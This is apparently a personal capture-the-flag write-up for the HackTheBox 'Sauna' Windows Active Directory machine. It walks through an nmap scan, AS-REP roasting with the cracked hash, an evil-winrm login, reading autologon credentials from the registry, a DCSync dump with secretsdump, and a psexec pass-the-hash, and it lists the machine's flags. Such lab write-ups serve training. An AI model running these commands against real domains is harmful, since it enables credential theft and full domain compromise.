```json
Alias: Sauna
Date: 04-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Easy
Status: Complete
IP: 10.129.252.171
```

# Sauna
# Summary

 Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn't require Kerberos pre-authentication. This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the *DS-Replication-Get-Changes-All* extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket&amp;amp;#039;s psexec.py in order to gain a shell on the box as `NT_AUTHORITY\SYSTEM`.

# Used Tools

* Kerbrute
* secretsdump
* psexec
 
---

# Information Gathering
## NMAP
```
s up (0.27s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-04 22:13:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-08-04T22:13:33
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.75 seconds
```
## Discovered Subdomains
```
egotistical-bank.htb
EGOTISTICAL-BANK.LOCAL
```

---
# Enumeration
## Port 80 - HTTP (Appache)
Nothing seems vulnerable, A static site with a few pages

- [x] Enumerated
- [ ] Vulnerable

## Port 389 (LDAP)
Anonymous binding disabled.

- [x]  Enumerated
- [ ] Vulnerable
## Port 445 - SMB (SMBV2)
Anonymous binding disabled.

- [x] Enumerated
- [ ] Vulnerable

## Port 464 (Kerberos)
No Pre-Auth on fsmith

- [x] Enumerated
- [x] Vulnerable

---

# Exploitation
## Local Enumeration
Found Hash for user fsmith due to no Kerberos Pre-Auth.
```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c461584c7b3a4b1264bb11427d30c50e$114f139f0a9cc47a052d940a4cec15c32af5f6267af85e037b8b4e1b9cd35b8e914a771775bffde84487b66d6e3069b7eda300768eb9056b593b9ffcb405af0dce437f7f31c03074716395c11cf5008b87f29a64629d3104ebc72f09caba56fbbef3e3a009d408c26b14a44e832d505615ef8554358790de40bc1460af6d0fb5ae30db34827625b507bbd5e8603486898ecb7251b5457f3d4b6f2bf39fd092defd073e02e2f2fbbf47bf4dd5881a4a825e891e91c49a748e025e0f4a1aac831dc8ab63f6630034ee268cd225fb6c1cd27db75cfdd493db2d945bc3594a16e39f9036c817d8737a379c5903b1e67a3041c5cd7859e3023bd322df7ec1eafde1c5
```

The other valid username is hsmith.

Cracking the AS-REP with hashcate we find the following password

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c461584c7b3a4b1264bb11427d30c50e$114f139f0a9cc47a052d940a4cec15c32af5f6267af85e037b8b4e1b9cd35b8e914a771775bffde84487b66d6e3069b7eda300768eb9056b593b9ffcb405af0dce437f7f31c03074716395c11cf5008b87f29a64629d3104ebc72f09caba56fbbef3e3a009d408c26b14a44e832d505615ef8554358790de40bc1460af6d0fb5ae30db34827625b507bbd5e8603486898ecb7251b5457f3d4b6f2bf39fd092defd073e02e2f2fbbf47bf4dd5881a4a825e891e91c49a748e025e0f4a1aac831dc8ab63f6630034ee268cd225fb6c1cd27db75cfdd493db2d945bc3594a16e39f9036c817d8737a379c5903b1e67a3041c5cd7859e3023bd322df7ec1eafde1c5:Thestrokes23
```

## Vector
The user fsmith has winrm access

```bash
evil-winrm -i $IP -u fsmith -p Thestrokes23
```


---

# Lateral Movement

## Local Enumeration
Autologon is enabled for user svc_loanmanager

```cmd
cmd /c 'reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"'
```

With the above command we get creds for svc_loanmanager

| User        | Password                   |
| ----------- | -------------------------- |
| svc_loanmgr | Moneymakestheworldgoround! |

## Lateral Movement Vector
The svc_loanmgr account has DCSync rights. We can use secretsdump.py to get NTDS.DIT

```bash
secretsdump.py EGOTISTICAL-BANK/svc_loanmgr@$IP
```

---

# Privilege Escalation

## Privilege Escalation Vector
Finally use psexec to get a shell and get root flag.
```bash
psexec.py administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

---

# Flags
- 4df4205b75734cceab38d9f96d9aba2d
- c6922df065ca5dfd8d38fc23d67aec32

	#CTF #CTF/Hackthebox #CTF/Hackthebox/Easy   #Windows #ActiveDirectory #ActiveDirectory/ASREPRoasting #ActiveDirectory/DCSync 